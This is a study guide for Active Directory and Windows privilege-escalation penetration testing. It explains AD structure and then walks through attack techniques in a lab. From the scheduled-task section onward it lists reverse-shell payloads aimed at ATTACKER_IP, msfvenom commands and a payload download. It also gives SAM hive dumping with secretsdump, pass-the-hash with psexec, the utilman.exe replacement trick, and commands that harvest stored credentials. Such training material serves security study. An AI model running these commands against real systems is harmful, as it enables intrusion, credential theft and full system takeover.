# ACTIVE DIRECTORY PENETRATION TESTING

---

## LAB ENVIRONMENT SETUP

### INSTALL & CONFIGURE DHCP ROLES FOR THE DOMAIN CONTROLLER

- ADD Lease Duration, Config DHCP options
- CREATE DHCP Server Scope, ADD Exclusions
- Specify the parent domain you want the client computers on your network to use for DNS name Resolution

---

### Joining a Domain - Lab Setup

**Domain: web.app.com**

| Component | Details |
|-----------|---------|
| **DC Windows Server 2019** | |
| Hostname | Server1 |
| IP Address | 192.168.1.101 |
| Subnet Mask | 255.255.255.0 |
| Gateway | 192.168.1.254 |
| DNS | 127.0.0.1 (DC's own loopback) |

| Component | Details |
|-----------|---------|
| **Win 10 Workstation** | Windows 10 Enterprise Workstation |
| Hostname | Station1 |
| IP Address | 192.168.1.120 |
| Subnet Mask | 255.255.255.0 |
| Gateway | 192.168.1.254 |
| DNS | 192.168.1.101 |

Remember to change Computer Name to Server1. Domain will be having a DNS server Role.

**Lab Network Architecture:**


*Figure: Lab network topology showing Domain Controller, workstation, and attacker positioning with DNS/DHCP services*

---

## ACTIVE DIRECTORY FUNDAMENTALS & WINDOWS PRIVILEGE ESCALATION

### What is Active Directory?

**Windows domain** is a group of users and computers under the administration of a given business. The main idea behind a domain is to centralise the administration of common components of a Windows computer network in a single repository called Active Directory (AD). The server that runs the Active Directory services is known as a Domain Controller (DC).

## Active Directory
**Active Directory** is a collection of machines and servers connected inside of domains, that are a collective part of a bigger forest of domains, that make up the Active Directory network. Why use Active Directory? - Microsoft's Active Directory is the backbone of the corporate world. It simplifies the management of devices and users within a corporate environment.
The majority of large companies use Active Directory because it allows for the control and monitoring of their user's computers through a single domain controller. It allows a single user to sign in to any computer on the active directory network and have access to his or her stored files and folders in the server, as well as the local storage on that machine. This allows for any user in the company to use any machine that the company owns, without having to set up multiple users on a machine. Active Directory does it all for you.
The physical Active Directory is the servers and machines on-premise, these can be anything from domain controllers and storage servers to domain user machines; everything needed for an Active Directory environment besides the software.

    AD DS is a true directory service, with a hierarchical X.500-based structure.
    AD DS uses Domain Name System (DNS) for locating resources such as domain controllers.
    You can query and manage AD DS by using Lightweight Directory Access Protocol (LDAP) calls.
    AD DS primarily uses the Kerberos protocol for authentication.
    AD DS uses OUs and GPOs for management.
    AD DS includes computer objects, representing computers that join an Active Directory domain.
    AD DS uses trusts between domains for delegated management.

## Domain Controller
**A Domain Controller** is a Windows server that has Active Directory Domain Services (AD DS) installed and has been promoted to a domain controller in the forest. Domain controllers are the center of Active Directory -- they control the rest of the domain. Outlined below are the tasks of a domain controller: 
    holds the AD DS data store 
    handles authentication and authorization services 
    replicate updates from other domain controllers in the forest
    Allows admin access to manage domain resources

## AD DS Data Store 
The **Active Directory Data Store** holds the databases and processes needed to store and manage directory information such as users, groups, and services. The AD DS Data Store Contains the NTDS.dit - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users >> Stored by default in %SystemRoot%\NTDS and accessible only by the domain controller

The core of any Windows Domain is the Active Directory Domain Service (AD DS). This service acts as a catalogue that holds the information of all of the "objects" that exist on your network. Amongst the many objects supported by AD, we have users, groups, machines, printers, shares and many others.

**Active Directory Structure:**

```mermaid
graph TD
    Forest["Forest: company.com\nTop-level container"]
    
    Forest --> Tree1[Tree: company.com]
    Forest --> Tree2[Tree: subsidiary.com]
    
    Tree1 --> Domain1["Domain: company.com\nRoot domain"]
    Tree1 --> Domain2["Domain: sales.company.com\nChild domain"]
    Tree1 --> Domain3["Domain: dev.company.com\nChild domain"]
    
    Tree2 --> Domain4["Domain: subsidiary.com\nSeparate tree root"]
    
    Domain1 --> OU1[OU: Corporate]
    Domain1 --> OU2[OU: Servers]
    
    OU1 --> OU3[OU: HR]
    OU1 --> OU4[OU: IT]
    
    OU3 --> User1[👤 Users]
    OU3 --> Comp1[💻 Computers]
    OU3 --> Group1[👥 Groups]
    
    OU2 --> Server1[🖥️ Domain Controllers]
    OU2 --> Server2[🖥️ File Servers]
    
    style Forest fill:#ff9999
    style Tree1 fill:#ffcc99
    style Tree2 fill:#ffcc99
    style Domain1 fill:#99ccff
    style Domain2 fill:#99ccff
    style Domain3 fill:#99ccff
    style Domain4 fill:#99ccff
    style OU1 fill:#99ff99
    style OU2 fill:#99ff99
    style OU3 fill:#99ff99
    style OU4 fill:#99ff99
```



*Figure: Active Directory hierarchical structure showing Forest → Trees → Domains → Organizational Units → Objects*

## A Forest 
A **Forest** is a collection of one or more domain trees inside of an Active Directory network. It is what categorizes the parts of the network as a whole consists of these parts such as
Trees - A hierarchy of domains in Active Directory Domain Services
Domains - Used to group and manage objects 
Organizational Units (OUs) - Containers for groups, computers, users, printers and other OUs
Trusts - Allows users to access resources in other domains
Objects - users, groups, printers, computers, shares
Domain Services - DNS Server, LLMNR, IPv6, Http, LDAP
Domain Schema - Rules for AD-object creation

## Trusts
**Trusts** are a mechanism in place for users in the network to gain access to other resources in the domain. For the most part, trusts outline the way that the domains inside of a forest communicate to each other, in some environments trusts can be extended out to external domains and even forests in some cases. When attacking an Active Directory environment you can sometimes abuse these trusts in order to move laterally throughout the network.
There are two types of trusts that determine how the domains communicate. I'll outline the two types of trusts below: 
    Directional - The direction of the trust flows from a trusting domain to a trusted domain
    Transitive - The trust relationship expands beyond just two domains to include other trusted domains

**Trust Relationships Visualization:**


*Figure: Trust relationships showing that access flow is opposite to trust direction. In transitive trusts, E trusts F, F trusts G, therefore E trusts G automatically.*

---

### Domain Trust Exploitation

**Trust Exploitation Attack Paths:**


*Figure: Complete domain trust exploitation paths showing techniques for parent-child, external, forest, and shortcut trusts with SID filtering considerations*

---
**Users** are the core to Active Directory; The four types of users are: 
    Domain Admins - They control the domains and are the only ones with access to the domain controller.
    *Service Accounts (Can be Domain Admins) - These are for the most part never used except for service maintenance, they are required by Windows for services such as SQL to pair a service with a service account
    Local Administrators - These users can make changes to local machines as an administrator and may even be able to control other normal users, but they cannot access the domain controller
    Domain Users - These are your everyday users. They can log in on the machines they have the authorization to access and may have local administrator rights to machines depending on the organization.

## Organizational Units
**Organizational Units** are handy for applying policies to users and computers, which include specific configurations that pertain to sets of users depending on their particular role in the enterprise. Remember, a user can only be a member of a single OU at a time, as it wouldn't make sense to try to apply two different sets of policies to a single user. 
Policies are a very big part of Active Directory, they dictate how the server operates and what rules it will and will not follow. You can think of domain policies like domain groups, except instead of permissions they contain rules, and instead of only applying to a group of users, the policies apply to a domain as a whole. They simply act as a rulebook for Active  Directory that a domain admin can modify and alter as they deem necessary to keep the network running smoothly and securely.
Windows manages such policies through Group Policy Objects (GPO). GPOs are simply a collection of settings that can be applied to OUs. GPOs can contain policies aimed at either users or computers, allowing you to set a baseline on specific machines and identities. To configure GPOs, you can use the Group Policy Management tool, available from the start menu. 

## Groups
**Groups** make it easier to give resource permissions to users and objects by organizing them into groups with specified permissions. There are two overarching types of Active Directory groups and a Default set of Security Groups
Security Groups - are used to grant permissions over resources. For example, you will use groups if you want to allow some users to access a shared folder or network printer. A user can be a part of many groups, which is needed to grant access to multiple resources.
Distribution Groups - These groups are used to specify email distribution lists. 
Default Security Groups - Here is a brief outline of the security groups:

GPOs are distributed to the network via a network share called SYSVOL, which is stored in the DC. All users in a domain should typically have access to this share over the network to sync their GPOs periodically. The SYSVOL share points by default to the C:\Windows\SYSVOL\sysvol\ directory on each of the DCs in our network.
Once a change has been made to any GPOs, it might take up to 2 hours for computers to catch up. If you want to force any particular computer to sync its GPOs immediately, you can always run the following command on the desired computer:
Windows PowerShell Syntax >> PS C:\> gpupdate /force

        
## Authentication Methods
When using Windows domains, all credentials are stored in the Domain Controllers. Whenever a user tries to authenticate to a service using domain credentials, the service will need to ask the Domain Controller to verify if they are correct. Two protocols can be used for network authentication in windows domains:

**Kerberos**: Used by any recent version of Windows. This is the default protocol in any recent domain. Kerberos authentication is the default authentication protocol for any recent version of Windows. Users who log into a service using Kerberos will be assigned tickets. Think of tickets as proof of a previous authentication. Users with tickets can present them to a service to demonstrate they have already authenticated into the network before and are therefore enabled to use it.
**NetNTLM**: Legacy authentication protocol kept for compatibility purposes. NetNTLM works using a challenge-response mechanism.

**Kerberos Authentication Flow:**


*Figure: Kerberos ticket-based authentication showing the 6-step process for obtaining TGT and TGS tickets*
    
    
A new security group needs to be introduced when talking about trees and forests. The Enterprise Admins group will grant a user administrative privileges over all of an enterprise's domains. Each domain would still have its Domain Admins with administrator privileges over their single domains and the Enterprise Admins who can control everything in the enterprise. “

The simplest trust relationship that can be established is a one-way trust relationship. In a one-way trust, if Domain AAA trusts Domain BBB, this means that a user on BBB can be authorised to access resources on AAA, NOTE: The direction of the one-way trust relationship is contrary to that of the access direction.

Two-way trust relationships can also be made to allow both domains to mutually authorise users from the other. By default, joining several domains under a tree or a forest will form a two-way trust relationship.

It is important to note that having a trust relationship between domains doesn't automatically grant access to all resources on other domains. Once a trust relationship is established, you have the chance to authorise users across different domains, but it's up to you what is actually authorised or not.
    
## Domain Controllers - All domain controllers in the domain

    Domain Guests - All domain guests
    Domain Users - All domain users
    Domain Computers - All workstations and servers joined to the domain
    Domain Admins - Designated administrators of the domain
    Enterprise Admins - Designated administrators of the enterprise
    Schema Admins - Designated administrators of the schema
    DNS Admins - DNS Administrators Group
    DNS Update Proxy - DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
    Allowed RODC Password Replication Group - Members in this group can have their passwords replicated to all read-only domain controllers in the domain
    Group Policy Creator Owners - Members in this group can modify group policy for the domain
    Denied RODC Password Replication Group - Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
    Protected Users - Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
    Cert Publishers - Members of this group are permitted to publish certificates to the directory
    Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the domain
    Enterprise Read-Only Domain Controllers - Members of this group are Read-Only Domain Controllers in the enterprise
    Key Admins - Members of this group can perform administrative actions on key objects within the domain.
    Enterprise Key Admins - Members of this group can perform administrative actions on key objects within the forest.
    Cloneable Domain Controllers - Members of this group that are domain controllers may be cloned.
    RAS and IAS Servers - Servers in this group can access remote access properties of users


## Windows Users && Privilege Escalation
**Windows systems** mainly have two kinds of users. Depending on their access levels, we can categorise a user in one of the following groups:
Administrators	These users have the most privileges. They can change any system configuration parameter and access any file in the system.
Standard Users	These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files.
Any user with administrative privileges will be part of the Administrators group. On the other hand, standard users are part of the Users group.
In addition to that, you will usually hear about some special built-in accounts used by the operating system in the context of privilege escalation:
**SYSTEM / LocalSystem**
	An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators.
**Local Service**
	Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.
**Network Service**
	Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.
These accounts are created and managed by Windows, and you won't be able to use them as other regular accounts. Still, in some situations, you may gain their privileges due to exploiting specific services.

**Windows Privilege Escalation Decision Tree:**


*Figure: Windows privilege escalation decision tree showing enumeration, exploitation vectors, and recommended priority order*

---

## Unattended Windows Installations
When installing Windows on a large number of hosts, administrators may use Windows Deployment Services, which allows for a single operating system image to be deployed to several hosts through the network. These kinds of installations are referred to as unattended installations as they don't require user interaction. Such installations require the use of an administrator account to perform the initial setup, which might end up being stored in the machine in the following locations:
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

## Powershell History
Whenever a user runs a command using Powershell, it gets stored into a file that keeps a memory of past commands. This is useful for repeating commands you have used before quickly. If a user runs a command that includes a password directly as part of the Powershell command line, it can later be retrieved by using the following command from a cmd.exe prompt:
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
Note: The command above will only work from cmd.exe, as Powershell won't recognize %userprofile% as an environment variable. To read the file from Powershell, you'd have to replace %userprofile% with $Env:userprofile. 

## Saved Windows Credentials
Windows allows us to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials:
```text
cmdkey /list
```
While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen below.
```text
runas /savecred /user:InsertUsername cmd.exe.  
```

## IIS Configuration
***Internet Information Services (IIS)*** is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms. Depending on the installed version of IIS, we can find web.config in one of the following locations:
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
Here is a quick way to find database connection strings on the file syntax:
```text
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

## Retrieve Credentials from Software: PuTTY
**PuTTY** is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use. While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.
To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:
```text
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
Note: Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.
Just as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved.

## Scheduled Tasks
Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.
Scheduled tasks can be listed from the command line using the “schtasks” command without any options. To retrieve detailed information about any of the services, you can use a command like the following one:
```text
Command Prompt Syntax >> schtasks /query /tn vulntask /fo list /v
```
        
You will get lots of information about the task, but what matters for us is the "Task to Run" parameter which indicates what gets executed by the scheduled task, and the "Run As User" parameter, which shows the user that will be used to execute the task.
If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the that user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use “icacls” command

If the result shows that the BUILTIN\Users group has full access (F) over the task's binary. This means we can modify the file and insert any payload we like to spawn a reverse shell:
Payload Command Prompt Syntax
```text
 echo PAYLOAD_FILE.exe -e cmd.exe ATTACKER_IP PORT > C:\{PATH_TO_FILE}      
```
We then start a listener on the attacker machine on the same port we indicated on our reverse shell: nc -lvp 4444
The next time the scheduled task runs, you should receive the reverse shell with that Users privileges. While you probably wouldn't be able to start the task in a real scenario and would have to wait for the scheduled task to trigger, we have provided your user with permissions to start the task manually to save you some time. We can run the task with the following command:
```text
Command Prompt Syntax >> schtasks /run /tn vulntask
```
        
## Abusing AlwaysInstallElevated Reg Policy 
Windows installer files (also known as .msi files) are used to install applications on the system. They usually run with the privilege level of the user that starts it. However, these can be configured to run with higher privileges from any user account (even unprivileged ones). This could potentially allow us to generate a malicious MSI file that would run with admin privileges.
Note: This method requires two registry values to be set. You can query these from the command line using the commands below.
Command Prompt syntax for enabling ALWAYSINSTALLELEVATED POLICY
```text
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer        
```
To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can move to generate a malicious .msi file using msfvenom.
```text
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_IP LPORT=ATTACKING_PORT -f msi -o malicious.msi
```
Once you have transferred the file you have created(i.e using python webServer), you can run the installer with the command below and receive the reverse shell:
Command Prompt 
```text
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
Note: As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly.

### Windows Services
Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.
Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.
To better understand the structure of a service, let's check the apphostsvc service configuration with the sc qc command:
Command Prompt Syntax for using Service Control (SC) with Query option
```text
C:\> sc qc serviceName
```
Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.
From the results, see that the associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter.Services also have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. All of the services configurations are stored on the registry under HKLM_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\

A subkey exists for every service in the system. Again, we can see the associated executable on the ImagePath value and the account used to start the service on the ObjectName value. If a DACL has been configured for the service, it will be stored in a subkey called Security. As you have guessed by now, only administrators can modify such registry entries by default.

## Insecure Permissions on Service Executable
Using *ICALS* command to check permissions. If the executable associated with a service has weak permissions(i.e modify permissions (M) on the service's executable) that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account User used to start it. Using MSFVenom generate a generate an exe-service payload using msfvenom and serve it through a python webserver,  Restart the service and Listen for connection using Metasploit default Multi/Handler or Netcat.
Kali Linux
```text
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```
We can then pull the payload from Powershell with the following command:
```powershell
wget http://ATTACKER_IP:8080/rev-svc.exe -O rev-svc.exe
```
Once the payload is in the Windows server, we proceed to replace the service executable with our payload

## Unquoted Service Paths
When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.
When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.
As an example, let's look at the difference between two services. The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by 
BINARY_PATH_NAME: "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
 VS BINARY_PATH_NAME: C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe

| Command | Argument 1 | Argument 2 |
|---|---|---|
| C:\MyPrograms\Disk.exe | Sorter | Enterprise\bin\disksrs.exe |
| C:\MyPrograms\Disk Sorter.exe | Enterprise\bin\disksrs.exe |  |
| C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |  |  |
When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute
This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute C:\\MyPrograms\\Disk.exe and take the rest as arguments.
Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:
First, search for C:\\MyPrograms\\Disk.exe. If it exists, the service will run this executable.
If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter.exe. If it exists, the service will run this executable.
If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. This option is expected to succeed and will typically be run in a default installation.
From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.

Insecure Service Permissions
You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.
To check for a service DACL from the command line, you can use Accesschk(As a part of ensuring that they've created a secure environment Windows administrators often need to know what kind of accesses specific users or groups have to resources including files, directories, Registry keys, global objects and Windows services. AccessChk quickly answers these questions with an intuitive interface and output. https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite.
Syntax: AccessChk.exe -qlc ServiceNameTobeQueried
```text
AccessChk.exe -qlc ServiceNameTobeQueried
```

### Windows Privileges
Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.
Each user has a set of assigned privileges that can be checked with the following command: You can check your own privileges with “whoami /priv”. Disabled privileges are as good as enabled ones. The only important thing is if you have the privilege on the list or not. A complete list of available privileges on Windows systems is available here. From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the https://github.com/gtworek/Priv2Admin 

SeBackup / SeRestore
The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.
Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash
Note: Users accounts in "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges.

1. check priviliges >>
```text
Whoami /priv
```
To backup the SAM and SYSTEM hashes, we can use the following commands:
```text
C:\> reg save hklm\system C:\Users\Username\system.hive
The operation completed successfully.
C:\> reg save hklm\sam C:\Users\Username\sam.hive
The operation completed successfully.
```
2. This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. 
3. Use impacket to retrieve the users' password hashes 
```text
    python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
    Dumping local SAM hashes (uid:rid:lmhash:nthash) ... for all users
```
4. Grab the Administrator hash, use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:
```text
python3.9 /opt/impacket/examples/psexec.py -hashes Admin_hash{nt:lm} Administrator@Target_IP
```


### SeTakeOwnership
The **SeTakeOwnership privilege** allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable

1. Use TakeOwnership command Syntax >> 
```text
takeown /f C:\Windows\System32\Utilman.exe
```
Just for test purposes We'll abuse utilman.exe to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen
Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial. To replace utilman, we will start by taking ownership of it with the following command
2 Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command syntax below
icacls C:\Windows\System32\Utilman.exe /grant Username:F
```text
icacls C:\Windows\System32\Utilman.exe /grant Username:F
```
3 After this, we will replace utilman.exe with a copy of cmd.exe:
Command Prompt
```text
C:\Windows\System32\> copy cmd.exe utilman.exe
```
And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges which you can comfirm with whoami /priv

**SeImpersonate / SeAssignPrimaryToken**
These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.
As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.
In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges 

Unpatched Software
Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the wmic tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):
```text
wmic product get name,version,vendor
```

Remember that the wmic product command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable. Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like exploit-db, packet storm or plain old Google, amongst many others.Using wmic and Google, can you find a known vulnerability on any installed product?

### Automated Scripts #ToolsOfTrade
Several scripts exist to conduct system enumeration in ways similar to the ones seen in the previous task. These tools can shorten the enumeration process time and uncover different potential privilege escalation vectors. However, please remember that automated tools can sometimes miss privilege escalation.
Below are a few tools commonly used to identify privilege escalation vectors. Feel free to run them against any of the machines in this room and see if the results match the discussed attack vectors.

WinPEAS
WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:
Command Prompt         
```text
C:\> winpeas.exe > outputfile.txt
```

## PrivescCheck
**PrivescCheck** is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.
PrivescCheck can be downloaded here. https://github.com/itm4n/PrivescCheck
From a command prompt:
```text
C:\Temp\> powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

From a PowerShell prompt:
```powershell
PS C:\Temp\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\Temp\> . .\PrivescCheck.ps1; Invoke-PrivescCheck
```

From a PowerShell prompt without modifying the execution policy:
```powershell
PS C:\Temp\> Get-Content .\PrivescCheck.ps1 | Out-String | IEX
PS C:\Temp\> Invoke-PrivescCheck 
```

# Navigate to the directory containing the script (if necessary)
```powershell
cd C:\Path\To\Your\Script
```

# Dot source the script to load the function
```powershell
. .\Get-ADConnectPassword.ps1
```

# Call the function
```powershell
Get-ADConnectPassword
```


These methods provide various ways to access service configuration details & find service binary paths that could be modified by a low privileged user depending on your permissions and the specific requirements of your environment.

### 1. Using `sc.exe` Utility
```powershell
sc.exe queryex type= service state= all | ForEach-Object { if ($_ -match "SERVICE_NAME:") { sc.exe qc ($_.Trim().Split(":")[1].Trim()) | Select-String "BINARY_PATH_NAME" }}
```
**Explanation:** Utilizes the external command `sc.exe` to query extended information about services, including their binary path. This method parses output from `sc.exe` to extract necessary details.

### 2. Using `Get-WmiObject`
```powershell
Get-WmiObject -Query "Select * from Win32_Service" | Select Name, StartMode, PathName
```
**Explanation:** This command retrieves details about services using WMI (Windows Management Instrumentation), including the path of the executable associated with each service. This command uses the Get-WmiObject cmdlet to retrieve information about services. The cmdlet accesses Windows Management Instrumentation (WMI) to get details about service objects. While powerful, WMI queries require certain permissions on the system to execute successfully, especially when accessing detailed service configurations like PathName. If your user account doesn't have the necessary permissions, it could result in a "Permission Denied" error.


### 3. Using `Get-Service` and `Select-Object`
```powershell
Get-Service | ForEach-Object { Get-WmiObject -Query "Select PathName from Win32_Service Where Name = '$($_.Name)'" } | Select PathName
```
**Explanation:** This combines `Get-Service` with `Get-WmiObject` to fetch the executable path for each service. It iterates over each service, querying WMI for its execution path. WMI queries require certain permissions on the system to execute successfully, especially when accessing detailed service configurations like PathName. If your user account doesn't have the necessary permissions, it could result in a "Permission Denied" error.

### 4a. Querying the Registry Directly
```powershell
(gci HKLM:\SYSTEM\ControlSet001\Services | Get-ItemProperty | where {$_.ObjectName -match 'LocalSystem'}).PSChildName
```
This command uses a different approach:
gci (Get-ChildItem) -> This cmdlet is used to list items in the specified registry path (HKLM:\SYSTEM\ControlSet001\Services). Accessing registry keys generally requires fewer permissions than querying service details through WMI, depending on the system's security settings.
Get-ItemProperty - Retrieves properties of each service listed in the registry. This typically includes basic configuration data stored directly in the registry.
where {$_.ObjectName -match 'LocalSystem'} - Filters services running under the LocalSystem account. The ObjectName property corresponds to the service's logon account.
.PSChildName - Extracts the names of the services that meet the filter criteria.

### 4b. Querying the Registry Directly
```powershell
Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Services\* | Select PSChildName, ImagePath
```
**Explanation:** Directly queries the registry to get the image paths of services. Accessing registry keys generally requires fewer permissions than querying service details through WMI, depending on the system's security settings. This method can bypass some restrictions that WMI queries face.

Windows Exploit Suggester - Next Generation (WES-NG)
WES-NG is a tool based on the output of Windows' systeminfo utility which provides the list of vulnerabilities the OS is vulnerable to, including any exploits for these vulnerabilities. Every Windows OS between Windows XP and Windows 11, including their Windows Server counterparts, is supported.
Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).
WES-NG is a Python script that can be found and downloaded here 
https://github.com/bitsadmin/wesng

Metasploit
If you already have a Meterpreter shell on the target system, you can use the multi/recon/local_exploit_suggester module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.

### Mimikatz
**Mimikatz** is a Windows x32/x64 program coded in C by Benjamin Delpy (@gentilkiwi) in 2007 to learn more about Windows credentials (and as a Proof of Concept). There are two optional components that provide additional features, mimidrv (driver to interact with the Windows kernal) and mimilib (AppLocker bypass, Auth package/SSP, password filter, and sekurlsa for WinDBG). Mimikatz requires administrator or SYSTEM and often debug rights in order to perform certain actions and interact with the LSASS process (depending on the action requested). The Mimikatz.exe contains, or at least should contain, all capability noted there.

**Mimikatz** capability can be leveraged by compiling and running your own version, running the Mimikatz executable, leveraging the MetaSploit script[Fortunately, Metasploit has decided to include Mimikatz as a meterpreter script to allow for easy access to its full set of features without needing to upload any files to the disk of the compromised host], the official Invoke-Mimikatz PowerShell version, or one of the dozen of Mimikatz PowerShell variants (I happen to be partial to PowerShell Empire, because Empire is awesome!).

**Enabling LSA protection:**
    Open the Registry Editor (RegEdit.exe), and navigate to the registry key that is located at: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa and Set the value of the registry key to: “RunAsPPL”=dword:00000001.
